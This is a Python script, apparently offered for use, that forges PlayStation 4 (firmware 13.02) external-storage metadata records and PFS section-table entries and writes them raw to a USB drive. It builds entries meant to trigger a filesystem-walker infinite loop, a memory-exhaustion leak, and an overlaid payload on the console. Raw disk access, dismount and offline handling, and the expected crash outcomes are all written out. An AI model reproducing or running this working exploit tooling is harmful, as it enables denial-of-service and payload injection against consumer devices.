#!/usr/bin/env python3
"""
ps4_forge.py — merged Fahrenheit + PFS section-table forger (PS4 13.02)

Two primitives, one tool, one raw-I/O layer.

  --mode record   Fahrenheit-style: patch len_a/len_b, overlay payload at
                  0x6040 of the metadata record. Writes a valid record image.

  --mode loop     pfs_mount walker bug A: entry with stride=0, id!=0.
  --mode leak     bug A + name_len=0 (blk_bitmap branch fires each iter,
                  leaks at least 0x200/iter plus buffer-cache allocations).
  --mode payload  overlay only, no table.
  --mode all      loop entry + payload overlay.

  --diagnose      read 0x6000..0x6080 and report. No writes.
  --scan          scan disk for section-table-like patterns. No writes.
  --reset         offline + online the disk to clear a stuck volume stack.

Shared primitives:
  --list          enumerate physical disks
  --no-write      produce merged image, skip device write
  --force         required for any device write

Requires jm_real.bin as skeleton for every write.
Refuses to write without --force.

Usage:
    python ps4_forge.py --list
    python ps4_forge.py --diagnose --disk 1
    python ps4_forge.py --scan --disk 1 --scan-end 0x200000
    python ps4_forge.py --reset --disk 1

    python ps4_forge.py --mode record --payload payload.bin --no-write
    python ps4_forge.py --mode record --payload payload.bin --disk 1 --force

    python ps4_forge.py --mode loop  --table-off 0x100000 --no-write
    python ps4_forge.py --mode loop  --table-off 0x100000 --disk 1 --force
    python ps4_forge.py --mode leak  --table-off 0x100000 --disk 1 --force
    python ps4_forge.py --mode all   --payload payload.bin \
                                    --table-off 0x100000 --disk 1 --force
"""

import os, sys, json, struct, platform, subprocess, argparse, time
from pathlib import Path
from typing import Optional

# =============================================================== constants
LABEL       = b"PS4 External Storage Metadata R\x00"
LABEL_OFF   = 0x6000
VER_OFF     = 0x6024
LEN_A_OFF   = 0x6030
LEN_B_OFF   = 0x6038
BODY_OFF    = 0x6040
SECTOR      = 512

LEN_A_GOOD  = 0x000000E86A034000
LEN_B_GOOD  = 0x000000E86A00E000

ENTRY_SIZE         = 0x38        # section entry fixed stride (guess)
DEFAULT_TABLE_OFF  = 0x100000    # partition at LBA 2048

IS_WIN = platform.system() == "Windows"
IS_LIN = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"
HERE   = Path(__file__).resolve().parent

# =============================================================== raw I/O
if IS_WIN:
    import ctypes
    from ctypes import wintypes
    _k32 = ctypes.WinDLL("kernel32", use_last_error=True)

    _k32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
        ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
    _k32.CreateFileW.restype  = wintypes.HANDLE

    _k32.SetFilePointerEx.argtypes = [wintypes.HANDLE, ctypes.c_longlong,
        ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD]
    _k32.SetFilePointerEx.restype  = wintypes.BOOL

    _k32.ReadFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    _k32.ReadFile.restype  = wintypes.BOOL

    _k32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    _k32.WriteFile.restype  = wintypes.BOOL

    _k32.CloseHandle.argtypes = [wintypes.HANDLE]
    _k32.CloseHandle.restype  = wintypes.BOOL

    _k32.DeviceIoControl.argtypes = [
        wintypes.HANDLE, wintypes.DWORD, ctypes.c_void_p, wintypes.DWORD,
        ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD),
        ctypes.c_void_p]
    _k32.DeviceIoControl.restype = wintypes.BOOL

    FSCTL_LOCK_VOLUME            = 0x00090018
    FSCTL_UNLOCK_VOLUME          = 0x0009001C
    FSCTL_DISMOUNT_VOLUME        = 0x00090020
    FSCTL_ALLOW_EXTENDED_DASD_IO = 0x00090083

    _GR, _GW = 0x80000000, 0x40000000
    _OPEN_EXISTING = 3
    # FIX: include FILE_SHARE_DELETE (4) so other components don't block us.
    _SHARE_RW = 1 | 2 | 4
    _INVALID = (1 << (8 * ctypes.sizeof(ctypes.c_void_p))) - 1

    def _ioctl(h, code):
        ret = wintypes.DWORD(0)
        ok = _k32.DeviceIoControl(h, code, None, 0, None, 0,
                                  ctypes.byref(ret), None)
        return bool(ok)

    def _lock_and_dismount(h):
        """Acquire lock, dismount, allow extended DASD I/O on a raw handle."""
        results = {}
        results["extended"] = _ioctl(h, FSCTL_ALLOW_EXTENDED_DASD_IO)
        results["lock"]     = _ioctl(h, FSCTL_LOCK_VOLUME)
        results["dismount"] = _ioctl(h, FSCTL_DISMOUNT_VOLUME)
        return results

    def _open(path, write):
        h = _k32.CreateFileW(
            path, _GR | (_GW if write else 0),
            _SHARE_RW, None, _OPEN_EXISTING, 0, None)
        hv = getattr(h, "value", h) or 0
        if isinstance(hv, int) and hv < 0:
            hv += 1 << (8 * ctypes.sizeof(ctypes.c_void_p))
        if hv == 0 or hv == _INVALID:
            raise OSError(
                f"CreateFile {path}: Win32 {ctypes.get_last_error()} "
                f"(run elevated, close HxD and Disk Management)")
        return h

    def _seek(h, off):
        np = ctypes.c_longlong(0)
        if not _k32.SetFilePointerEx(h, ctypes.c_longlong(off),
                                     ctypes.byref(np), 0):
            raise OSError(f"seek {off:#x}: {ctypes.get_last_error()}")

    def _read(h, off, n):
        base = (off // SECTOR) * SECTOR
        delta = off - base
        want = n + delta
        if want % SECTOR:
            want = ((want + SECTOR - 1) // SECTOR) * SECTOR
        _seek(h, base)
        buf = ctypes.create_string_buffer(want)
        got = wintypes.DWORD(0)
        if not _k32.ReadFile(h, buf, want, ctypes.byref(got), None):
            raise OSError(f"read {base:#x}: {ctypes.get_last_error()}")
        if got.value != want:
            raise OSError(f"short read {base:#x}: {got.value}/{want}")
        return buf.raw[delta:delta + n]

    def _write(h, off, data):
        if off % SECTOR or len(data) % SECTOR:
            raise ValueError(f"unaligned write {off:#x}/{len(data)}")
        _seek(h, off)
        buf = ctypes.create_string_buffer(data, len(data))
        got = wintypes.DWORD(0)
        if not _k32.WriteFile(h, buf, len(data), ctypes.byref(got), None):
            err = ctypes.get_last_error()
            if err == 21:
                raise OSError(
                    f"write {off:#x}: ERROR_NOT_READY (21). "
                    f"Disk volume stack still live. "
                    f"Run: python ps4_forge.py --reset --disk N")
            raise OSError(f"write {off:#x}: Win32 {err}")
        if got.value != len(data):
            raise OSError(f"short write {got.value}/{len(data)}")

    def _close(h):
        _k32.CloseHandle(h)

    def devpath(n):
        return rf"\\.\PhysicalDrive{n}"

    def list_disks():
        ps = ("Get-CimInstance Win32_DiskDrive | Select-Object "
              "Index,Model,Size,InterfaceType,MediaType | "
              "ConvertTo-Json -Compress -Depth 3")
        try:
            out = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps],
                capture_output=True, text=True, timeout=15).stdout
            d = json.loads(out.strip() or "[]")
            if isinstance(d, dict):
                d = [d]
            return [{
                "index": int(x.get("Index", -1)),
                "model": str(x.get("Model", "")),
                "size":  int(x.get("Size", 0) or 0),
                "iface": str(x.get("InterfaceType", "") or ""),
                "media": str(x.get("MediaType", "") or ""),
            } for x in d]
        except Exception:
            return []

    def dismount(n):
        ps = (f"$ErrorActionPreference='SilentlyContinue';"
              f"Get-Partition -DiskNumber {n} | "
              f"Where-Object {{$_.DriveLetter}} | "
              f"Select-Object -ExpandProperty DriveLetter")
        letters = []
        try:
            out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                 capture_output=True, text=True, timeout=10).stdout
            letters = [x.strip() for x in out.split() if x.strip()]
        except Exception:
            pass

        for letter in letters:
            vol = f"\\\\.\\{letter}:"
            try:
                vh = _k32.CreateFileW(vol, _GR | _GW, _SHARE_RW,
                                      None, _OPEN_EXISTING, 0, None)
                hv = getattr(vh, "value", vh) or 0
                if isinstance(hv, int) and hv < 0:
                    hv += 1 << (8 * ctypes.sizeof(ctypes.c_void_p))
                if hv == 0 or hv == _INVALID:
                    continue
                try:
                    _ioctl(vh, FSCTL_LOCK_VOLUME)
                    _ioctl(vh, FSCTL_DISMOUNT_VOLUME)
                finally:
                    _k32.CloseHandle(vh)
            except Exception:
                pass

        ps2 = (f"$ErrorActionPreference='SilentlyContinue';"
               f"Get-Partition -DiskNumber {n} | "
               f"Where-Object {{$_.DriveLetter}} | ForEach-Object {{ "
               f"Remove-PartitionAccessPath -DiskNumber {n} "
               f"-PartitionNumber $_.PartitionNumber "
               f"-AccessPath ($_.DriveLetter + ':') }}")
        subprocess.run(["powershell", "-NoProfile", "-Command", ps2],
                       capture_output=True, timeout=15)

    def offline_disk(n):
        """Take disk offline. Returns True on success or if already offline."""
        ps = (f"$ErrorActionPreference='SilentlyContinue';"
              f"$d = Get-Disk -Number {n};"
              f"if ($d) {{ Set-Disk -Number {n} -IsOffline $true }};"
              f"if ($?) {{ '1' }} else {{ '0' }}")
        try:
            out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                 capture_output=True, text=True, timeout=15).stdout
            return out.strip().endswith("1")
        except Exception:
            return False

    def online_disk(n):
        """Bring disk back online. Returns True on success or if already online."""
        ps = (f"$ErrorActionPreference='SilentlyContinue';"
              f"$d = Get-Disk -Number {n};"
              f"if ($d) {{ Set-Disk -Number {n} -IsOffline $false }};"
              f"if ($?) {{ '1' }} else {{ '0' }}")
        try:
            out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                 capture_output=True, text=True, timeout=15).stdout
            return out.strip().endswith("1")
        except Exception:
            return False

    def disk_is_offline(n):
        ps = (f"$d = Get-Disk -Number {n} -ErrorAction SilentlyContinue; "
              f"if ($d) {{ $d.IsOffline }} else {{ 'unknown' }}")
        try:
            out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                 capture_output=True, text=True, timeout=10).stdout
            return out.strip().lower() == "true"
        except Exception:
            return False

    def is_system_disk(n):
        ps = (f"$d = Get-Disk -Number {n} -ErrorAction SilentlyContinue; "
              f"if ($d -and ($d.IsSystem -or $d.IsBoot)) {{'1'}} else {{'0'}}")
        try:
            out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                 capture_output=True, text=True, timeout=10).stdout
            return out.strip() == "1"
        except Exception:
            return True

else:
    def _open(path, write):
        try:
            return os.open(path, os.O_RDWR if write else os.O_RDONLY)
        except PermissionError:
            raise OSError(f"open {path}: permission denied (run as root)")

    def _seek(fd, off):
        os.lseek(fd, off, os.SEEK_SET)

    def _read(fd, off, n):
        _seek(fd, off)
        d = b""
        while len(d) < n:
            c = os.read(fd, n - len(d))
            if not c:
                break
            d += c
        if len(d) != n:
            raise OSError(f"short read {off:#x}: {len(d)}/{n}")
        return d

    def _write(fd, off, data):
        if len(data) % SECTOR:
            raise ValueError(f"unaligned write ({len(data)})")
        _seek(fd, off)
        w = 0
        while w < len(data):
            w += os.write(fd, data[w:])
        if w != len(data):
            raise OSError(f"short write {w}/{len(data)}")

    def _close(fd):
        try:
            os.close(fd)
        except Exception:
            pass

    def devpath(n):
        return f"/dev/sd{chr(ord('a')+n)}"

    def list_disks():
        out = []
        if not IS_LIN:
            return out
        try:
            r = subprocess.run(
                ["lsblk", "-J", "-b", "-o",
                 "NAME,TYPE,SIZE,MODEL,RM,TRAN"],
                capture_output=True, text=True, timeout=10).stdout
            for d in json.loads(r).get("blockdevices", []):
                if d.get("type") != "disk":
                    continue
                out.append({
                    "index": len(out),
                    "model": (d.get("model") or "").strip(),
                    "size":  int(d.get("size") or 0),
                    "iface": (d.get("tran") or "").upper(),
                    "media": "Removable" if str(d.get("rm")) == "1" else "Fixed",
                    "path":  f"/dev/{d['name']}",
                })
        except Exception:
            pass
        return out

    def dismount(n):
        pass

    def offline_disk(n):
        return True

    def online_disk(n):
        return True

    def disk_is_offline(n):
        return False

    def is_system_disk(n):
        return False

# =============================================================== helpers

def hexdump(data, base=0, width=16):
    out = []
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        h = " ".join(f"{b:02x}" for b in chunk)
        t = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"  {base+i:08x}  {h:<{width*3}}  {t}")
    return "\n".join(out)

def find_file(name, explicit=None):
    if explicit:
        p = Path(explicit)
        if p.exists():
            return p
        raise SystemExit(f"missing: {explicit}")
    for cand in [HERE / name, Path.cwd() / name]:
        if cand.exists():
            return cand
    return None

def pick_removable(disks):
    cand = [d for d in disks
            if "USB" in d.get("iface", "").upper()
            or d.get("media", "").lower().startswith("remov")]
    return cand or disks

# =============================================================== reset

def reset_disk(disk_index):
    """Offline + online the disk to clear a stuck volume stack."""
    if is_system_disk(disk_index):
        print(f"refusing: disk {disk_index} hosts the system volume")
        return 2

    print(f"resetting PhysicalDrive{disk_index}")
    print("  dismounting volumes...")
    dismount(disk_index)
    time.sleep(0.5)

    print("  offlining...")
    ok = offline_disk(disk_index)
    print(f"    offline: {'OK' if ok else 'FAILED'}")
    time.sleep(1.5)

    print("  onlining...")
    ok = online_disk(disk_index)
    print(f"    online:  {'OK' if ok else 'FAILED'}")
    time.sleep(1.0)

    state = "offline" if disk_is_offline(disk_index) else "online"
    print(f"  final state: {state}")
    return 0

# =============================================================== diagnose

def diagnose(disk_index):
    if is_system_disk(disk_index):
        print(f"refusing: disk {disk_index} hosts the system volume")
        return 2
    path = devpath(disk_index)
    print(f"diagnosing {path}")
    try:
        h = _open(path, False)
    except OSError as e:
        print(f"  cannot open: {e}")
        return 1
    try:
        head = _read(h, LABEL_OFF, 0x100)
        print(f"  bytes at 0x{LABEL_OFF:X} (256):")
        print(hexdump(head, base=LABEL_OFF))

        if head.startswith(LABEL):
            print(f"  label: PRESENT at 0x{LABEL_OFF:X}")
        else:
            idx = head.find(LABEL)
            if idx >= 0:
                print(f"  label: found at 0x{LABEL_OFF+idx:X}")
            else:
                window = _read(h, 0, 0x10000)
                idx = window.find(LABEL[:16])
                if idx >= 0:
                    print(f"  label: found at 0x{idx:X} in first 64 KB")
                else:
                    print("  label: NOT FOUND in first 64 KB")
                    print("  -> this drive has no PS4 metadata record")

        ver = _read(h, VER_OFF, 4)
        print(f"  version at 0x{VER_OFF:X}: {ver.hex()}  "
              f"({struct.unpack('<I', ver)[0]})")

        a = struct.unpack("<Q", _read(h, LEN_A_OFF, 8))[0]
        b = struct.unpack("<Q", _read(h, LEN_B_OFF, 8))[0]
        print(f"  len_a  at 0x{LEN_A_OFF:X}: {a:#018x}")
        print(f"  len_b  at 0x{LEN_B_OFF:X}: {b:#018x}")
        print(f"  expected a: {LEN_A_GOOD:#018x}")
        print(f"  expected b: {LEN_B_GOOD:#018x}")

        body = _read(h, BODY_OFF, 0x80)
        print(f"  body at 0x{BODY_OFF:X} (128):")
        print(hexdump(body, base=BODY_OFF))
        return 0
    finally:
        _close(h)

# =============================================================== scan

def scan_for_section_table(disk_index, start=0x0, end=0x200000,
                           entry_size=None):
    es = entry_size or ENTRY_SIZE
    if is_system_disk(disk_index):
        raise SystemExit(f"refusing: disk {disk_index} hosts the system")
    path = devpath(disk_index)
    h = _open(path, False)
    try:
        data = _read(h, start, end - start)
    finally:
        _close(h)

    hits = []
    for off in range(0, len(data) - es * 2, 4):
        e0_id     = struct.unpack_from("<I", data, off + 0x00)[0]
        e0_nameln = struct.unpack_from("<I", data, off + 0x08)[0]
        e0_stride = struct.unpack_from("<I", data, off + 0x0C)[0]
        if e0_id == 0 or not (0 < e0_nameln <= 0x40):
            continue
        if not (0x10 <= e0_stride <= 0x400):
            continue
        e1_off = off + e0_stride
        if e1_off + 0x10 > len(data):
            continue
        e1_id     = struct.unpack_from("<I", data, e1_off + 0x00)[0]
        e1_nameln = struct.unpack_from("<I", data, e1_off + 0x08)[0]
        e1_stride = struct.unpack_from("<I", data, e1_off + 0x0C)[0]
        if e1_id == 0 or not (0 < e1_nameln <= 0x40):
            continue
        if not (0x10 <= e1_stride <= 0x400):
            continue
        name0 = data[off + 0x10: off + 0x10 + min(e0_nameln, 0x20)]
        hits.append((start + off, e0_id, e0_nameln, e0_stride, name0))

    needle = b"blk_bitmap"
    i = 0
    while True:
        j = data.find(needle, i)
        if j < 0:
            break
        candidate = j - 0x10
        if candidate >= 0:
            hits.append((start + candidate, -1, -1, -1, needle))
        i = j + 1

    if not hits:
        print(f"no candidate section-table patterns in "
              f"0x{start:X}..0x{end:X}")
        return
    print(f"{len(hits)} candidate offsets:")
    seen = set()
    for off, eid, nameln, stride, name in hits[:64]:
        if off in seen:
            continue
        seen.add(off)
        printable = "".join(chr(b) if 32 <= b < 127 else "." for b in name)
        if eid >= 0:
            print(f"  0x{off:08X}  id={eid:<6}  namelen={nameln:<4}  "
                  f"stride=0x{stride:X}  name={printable!r}")
        else:
            print(f"  0x{off:08X}  (string hit)  name={printable!r}")

# =============================================================== entry build

def make_entry(eid, flags, name_len, stride, name=b"", entry_size=None):
    es = entry_size or ENTRY_SIZE
    e = bytearray(es)
    struct.pack_into("<I", e, 0x00, eid & 0xFFFFFFFF)
    struct.pack_into("<I", e, 0x04, flags & 0xFFFFFFFF)
    struct.pack_into("<I", e, 0x08, name_len & 0xFFFFFFFF)
    struct.pack_into("<I", e, 0x0C, stride & 0xFFFFFFFF)
    room = es - 0x10
    if room > 0:
        nb = name[:room]
        e[0x10:0x10+len(nb)] = nb
    return bytes(e)

def build_loop_entry(entry_size=None):
    """Bug A: stride=0, id!=0, name='blk_bitmap'."""
    return make_entry(eid=2, flags=0,
                      name_len=len(b"blk_bitmap") + 1,
                      stride=0, name=b"blk_bitmap",
                      entry_size=entry_size)

def build_leak_entry(entry_size=None):
    """Bug A + alloc leak: stride=0, name_len=0 (strncmp len 0 always matches)."""
    return make_entry(eid=2, flags=0,
                      name_len=0, stride=0, name=b"",
                      entry_size=entry_size)

# =============================================================== forge

def forge_record(base: bytes, payload: bytes, body_off: int = BODY_OFF) -> bytes:
    if base[LABEL_OFF:LABEL_OFF+len(LABEL)] != LABEL:
        raise SystemExit(f"base has no PS4 label at 0x{LABEL_OFF:X}")
    size = max(len(base), body_off + len(payload))
    size = (size + SECTOR - 1) // SECTOR * SECTOR
    img = bytearray(size)
    img[:len(base)] = base
    struct.pack_into("<Q", img, LEN_A_OFF, LEN_A_GOOD)
    struct.pack_into("<Q", img, LEN_B_OFF, LEN_B_GOOD)
    if payload:
        end = min(len(img), body_off + len(payload))
        n = end - body_off
        if n > 0:
            img[body_off:end] = payload[:n]
    return bytes(img)

def forge_pfs(base: bytes, mode: str, payload: bytes,
              table_off: int, body_off: int, entry_size=None) -> bytes:
    if base[LABEL_OFF:LABEL_OFF+len(LABEL)] != LABEL:
        raise SystemExit(f"base has no PS4 label at 0x{LABEL_OFF:X}")
    size = max(len(base), body_off + len(payload), table_off + 0x400)
    size = (size + SECTOR - 1) // SECTOR * SECTOR
    img = bytearray(size)
    img[:len(base)] = base

    if mode == "loop":
        table = build_loop_entry(entry_size)
    elif mode == "leak":
        table = build_leak_entry(entry_size)
    elif mode == "payload":
        table = b""
    elif mode == "all":
        table = build_loop_entry(entry_size) + build_leak_entry(entry_size)
    else:
        raise SystemExit(f"unknown mode: {mode}")

    if table:
        end = min(len(img), table_off + len(table))
        img[table_off:end] = table[:end - table_off]

    if payload:
        end = min(len(img), body_off + len(payload))
        n = end - body_off
        if n > 0:
            img[body_off:end] = payload[:n]

    return bytes(img)

# =============================================================== write

def write_image(disk_index, img, verify_table_off=None, entry_size=None):
    es = entry_size or ENTRY_SIZE
    if is_system_disk(disk_index):
        raise SystemExit(f"refusing: disk {disk_index} hosts the system")

    path = devpath(disk_index)
    print(f"target : {path}")
    print(f"image  : {len(img):,} bytes ({len(img)/1024/1024:.2f} MB)")

    # Step 1: dismount any volumes.
    print("dismounting volumes...")
    dismount(disk_index)
    time.sleep(0.3)

    # Step 2: take the disk offline (Windows only).
    # This is what actually forces the storage stack to release the disk.
    if IS_WIN:
        print("offlining disk...")
        offline_disk(disk_index)
        time.sleep(1.0)
        if disk_is_offline(disk_index):
            print("  disk is offline")
        else:
            print("  WARN: disk is still online — write may fail with error 21")

    # Step 3: open and lock the physical handle.
    print("opening physical handle...")
    h = _open(path, True)
    saved = None
    try:
        if IS_WIN:
            res = _lock_and_dismount(h)
            print(f"  lock={res['lock']} dismount={res['dismount']} "
                  f"extended={res['extended']}")
            # extended=False on a raw PhysicalDrive is normal; it's a
            # volume-handle-only IOCTL. Do not warn about it.

        try:
            saved = _read(h, 0, SECTOR)
            sig = f"{saved[510]:02x} {saved[511]:02x}" if len(saved) >= 512 else "?"
            print(f"saved MBR sig {sig}")
            if len(saved) >= 512 and (saved[510] != 0x55 or saved[511] != 0xAA):
                print("  WARN: MBR signature is not 55 AA. "
                      "Drive is in a bad state.")
                print("        Run: python ps4_forge.py --reset --disk N")
                print("        Then retry the write.")
        except OSError as e:
            print(f"WARN: MBR readback: {e}")

        chunk = 1 << 20
        w = 0
        total = len(img)
        while w < total:
            n = min(chunk, total - w)
            if n % SECTOR:
                n = ((n + SECTOR - 1) // SECTOR) * SECTOR
                if w + n > total:
                    n = total - w

            last_err = None
            for attempt in range(4):
                try:
                    _write(h, w, img[w:w+n])
                    last_err = None
                    break
                except OSError as e:
                    last_err = e
                    if IS_WIN:
                        try:
                            _lock_and_dismount(h)
                        except Exception:
                            pass
                    time.sleep(0.4 * (attempt + 1))
            if last_err is not None:
                if saved is not None:
                    try:
                        _write(h, 0, saved)
                        print("  MBR restored after failure")
                    except Exception:
                        pass
                raise last_err
            w += n
            print(f"  {w*100//total:3d}%  {w:,}/{total:,}")

        if saved is not None:
            _write(h, 0, saved)
            print("MBR restored")
    finally:
        if IS_WIN:
            try:
                _ioctl(h, FSCTL_UNLOCK_VOLUME)
            except Exception:
                pass
        _close(h)
        # Step 4: bring the disk back online so Windows can see it.
        if IS_WIN:
            print("onlining disk...")
            online_disk(disk_index)
            time.sleep(1.0)

    print("verifying...")
    h = _open(path, False)
    try:
        lab = _read(h, LABEL_OFF, len(LABEL) + 4)
        ok_lab = lab.startswith(LABEL)
        print(f"  label  {'OK' if ok_lab else 'MISSING'}")

        if verify_table_off is not None:
            tbl = _read(h, verify_table_off, es)
            tbl_id  = struct.unpack_from("<I", tbl, 0x00)[0]
            tbl_str = struct.unpack_from("<I", tbl, 0x0C)[0]
            print(f"  table  id={tbl_id} stride=0x{tbl_str:X}")
            print(hexdump(tbl, base=verify_table_off))

        a = struct.unpack("<Q", _read(h, LEN_A_OFF, 8))[0]
        b = struct.unpack("<Q", _read(h, LEN_B_OFF, 8))[0]
        print(f"  len_a  {'OK' if a == LEN_A_GOOD else 'MISMATCH'}  {a:#018x}")
        print(f"  len_b  {'OK' if b == LEN_B_GOOD else 'MISMATCH'}  {b:#018x}")
        return ok_lab
    finally:
        _close(h)

# =============================================================== main

def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--mode",
                    choices=["record", "loop", "leak", "payload", "all"],
                    default="record")
    ap.add_argument("--payload", default=None)
    ap.add_argument("--base", default=None)
    ap.add_argument("--disk", type=int, default=None)
    ap.add_argument("--out", default=None)
    ap.add_argument("--table-off", type=lambda x: int(x, 0),
                    default=DEFAULT_TABLE_OFF)
    ap.add_argument("--body-off", type=lambda x: int(x, 0),
                    default=BODY_OFF)
    ap.add_argument("--entry-size", type=lambda x: int(x, 0),
                    default=ENTRY_SIZE)
    ap.add_argument("--scan", action="store_true")
    ap.add_argument("--scan-end", type=lambda x: int(x, 0), default=0x200000)
    ap.add_argument("--diagnose", action="store_true")
    ap.add_argument("--reset", action="store_true",
                    help="offline + online the disk to clear a stuck "
                         "volume stack (no writes)")
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--no-write", action="store_true")
    ap.add_argument("--force", action="store_true")
    args = ap.parse_args()

    if args.list:
        for d in list_disks():
            gb = d.get("size", 0) / (1024**3)
            print(f"[{d['index']:>2}]  {gb:8.2f} GB  "
                  f"{d.get('iface', ''):<6}  {d.get('media', ''):<12}  "
                  f"{d.get('path', devpath(d['index']))}  {d.get('model', '')}")
        return

    if args.reset:
        if args.disk is None:
            sys.exit("--reset requires --disk N")
        sys.exit(reset_disk(args.disk))

    if args.diagnose:
        if args.disk is None:
            sys.exit("--diagnose requires --disk N")
        sys.exit(diagnose(args.disk))

    if args.scan:
        if args.disk is None:
            sys.exit("--scan requires --disk N")
        scan_for_section_table(args.disk, 0, args.scan_end,
                               entry_size=args.entry_size)
        return

    if not args.no_write and not args.force:
        sys.exit("refusing to write without --force")

    base_path = find_file("jm_real.bin", args.base)
    if base_path is None:
        sys.exit("jm_real.bin required (a real PS4-written record)")
    base = base_path.read_bytes()
    print(f"base    : {base_path} ({len(base):,} bytes)")

    payload = b""
    if args.mode in ("record", "payload", "all") or args.payload:
        p = find_file("payload.bin", args.payload)
        if p is None:
            if args.mode in ("payload", "all"):
                print("payload.bin not found; continuing without payload")
            else:
                print("payload.bin not found; record will patch len fields only")
        else:
            payload = p.read_bytes()
            print(f"payload : {p} ({len(payload):,} bytes)")

    if args.mode == "record":
        img = forge_record(base, payload, body_off=args.body_off)
        out_default = "merged_record.bin"
        table_for_verify = None
    else:
        img = forge_pfs(base, args.mode, payload,
                        table_off=args.table_off,
                        body_off=args.body_off,
                        entry_size=args.entry_size)
        out_default = f"merged_{args.mode}.bin"
        table_for_verify = args.table_off

    out_path = args.out or out_default
    Path(out_path).write_bytes(img)
    print(f"merged  : {out_path} ({len(img):,} bytes)")
    if args.mode != "record":
        print(f"table at 0x{args.table_off:X}  mode={args.mode}  "
              f"entry_size=0x{args.entry_size:X}")
        print(hexdump(img[args.table_off:args.table_off + 0x80],
                      base=args.table_off))

    if args.no_write:
        return

    disks = list_disks()
    disk = args.disk
    if disk is None:
        cand = pick_removable(disks)
        if not cand:
            sys.exit("no disk candidate; pass --disk N")
        disk = cand[0]["index"]
        print(f"auto-picked disk {disk}")

    ok = write_image(disk, img,
                     verify_table_off=table_for_verify,
                     entry_size=args.entry_size)
    print()
    if args.mode == "record":
        print("done. Eject, insert into PS4, tap 'Use This Extended Storage'.")
    else:
        print("done. Eject. Insert. Tap 'Use This Extended Storage'.")
        print("Expected:")
        print("  LED solid, console hangs    -> bug A fired")
        print("  LED flashing, then reboot   -> bug A + watchdog")
        print("  Runs out of memory, reboots -> leak mode")
        print("  Identical to baseline       -> table not at --table-off,")
        print("                                  or table is encrypted")

if __name__ == "__main__":
    main()